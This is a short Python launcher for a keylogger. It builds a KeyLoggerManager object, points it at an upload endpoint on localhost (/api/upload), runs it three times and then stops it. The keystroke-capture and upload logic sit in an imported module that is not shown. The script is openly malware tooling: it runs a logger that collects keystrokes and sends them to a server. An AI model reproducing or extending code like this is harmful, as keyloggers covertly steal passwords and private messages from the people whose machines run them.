import manager
hour = 60*60
#amount of hours to log for
log_hours = 3
def main():
    program = manager.KeyLoggerManager(5, "woodrow", "http://127.0.0.1:5000/api/upload", True)
    
    program.start()
    for i in range(3):  
        program.run()

    program.stop()
        
if __name__ == "__main__":
    main()